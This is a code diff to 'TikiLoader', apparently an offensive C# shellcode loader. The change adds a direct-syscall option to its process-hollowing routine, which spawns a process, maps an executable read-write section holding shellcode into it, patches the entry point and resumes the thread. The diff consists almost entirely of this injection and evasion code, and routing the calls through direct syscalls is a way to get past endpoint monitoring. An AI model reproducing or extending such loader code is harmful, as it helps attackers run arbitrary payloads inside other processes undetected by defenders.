@@ -11,6 +11,8 @@ namespace TikiLoader
         public int ParentId { get; set; } = 0;
         public bool BlockDlls { get; set; } = false;
 
+        private bool _syscalls;
+
         private IntPtr _section;
         private IntPtr _localMap;
         private IntPtr _remoteMap;
@@ -25,8 +27,10 @@ namespace TikiLoader
             _inner = Marshal.AllocHGlobal(512);
         }
         
-        public void Hollow(byte[] shellcode)
+        public void Hollow(byte[] shellcode, bool useSyscalls = false)
         {
+            _syscalls = useSyscalls;
+            
             var pi = Utilities.SpawnProcess(
                 BinaryPath,
                 WorkingDirectory,
@@ -105,14 +109,28 @@ namespace TikiLoader
         {
             _size = size;
 
-            Native.NtCreateSection(
-                ref _section,
-                (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
-                IntPtr.Zero,
-                ref _size,
-                Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
-                Data.Win32.WinNT.SEC_COMMIT,
-                IntPtr.Zero);
+            if (_syscalls)
+            {
+                Syscall.NtCreateSection(
+                    ref _section,
+                    (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
+                    IntPtr.Zero,
+                    ref _size,
+                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                    Data.Win32.WinNT.SEC_COMMIT,
+                    IntPtr.Zero);
+            }
+            else
+            {
+                Native.NtCreateSection(
+                    ref _section,
+                    (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
+                    IntPtr.Zero,
+                    ref _size,
+                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                    Data.Win32.WinNT.SEC_COMMIT,
+                    IntPtr.Zero);
+            }
         }
         
         private void SetLocalSection()
@@ -129,17 +147,34 @@ namespace TikiLoader
         {
             var address = baseAddress;
 
-            Native.NtMapViewOfSection(
-                _section,
-                procHandle,
-                ref address,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                ref _size,
-                1,
-                0,
-                protect);
+            if (_syscalls)
+            {
+                Syscall.NtMapViewOfSection(
+                    _section,
+                    procHandle,
+                    ref address,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    ref _size,
+                    1,
+                    0,
+                    protect);
+            }
+            else
+            {
+                Native.NtMapViewOfSection(
+                    _section,
+                    procHandle,
+                    ref address,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    ref _size,
+                    1,
+                    0,
+                    protect);
+            }
 
             return address;
         }
@@ -200,7 +235,7 @@ namespace TikiLoader
                 IntPtr.Zero);
 
             var patch = BuildEntryPatch();
-            var pSize = (IntPtr)patch.Size;
+            var pSize = (IntPtr) patch.Size;
 
             var oldProtect = Native.NtProtectVirtualMemory(
                 pi.hProcess,
@@ -212,7 +247,7 @@ namespace TikiLoader
                 pi.hProcess,
                 _pEntry,
                 patch.Ptr,
-                (uint)patch.Size);
+                (uint) patch.Size);
 
             _ = Native.NtProtectVirtualMemory(
                 pi.hProcess,
@@ -221,7 +256,11 @@ namespace TikiLoader
                 oldProtect);
 
             Marshal.FreeHGlobal(patch.Ptr);
-            Native.NtResumeThread(pi.hThread, IntPtr.Zero);
+
+            if (_syscalls)
+                Syscall.NtResumeThread(pi.hThread, IntPtr.Zero);
+            else
+                Native.NtResumeThread(pi.hThread, IntPtr.Zero);
         }
 
         private static void CloseHandles(Data.Win32.Kernel32.PROCESS_INFORMATION pi)
@@ -234,7 +273,10 @@ namespace TikiLoader
         {
             if (_localMap != IntPtr.Zero)
             {
-                Native.NtUnmapViewOfSection(_section, _localMap);
+                if (_syscalls)
+                    Syscall.NtUnmapViewOfSection(_section, _localMap);
+                else
+                    Native.NtUnmapViewOfSection(_section, _localMap);
             }
 
             Marshal.FreeHGlobal(_inner);
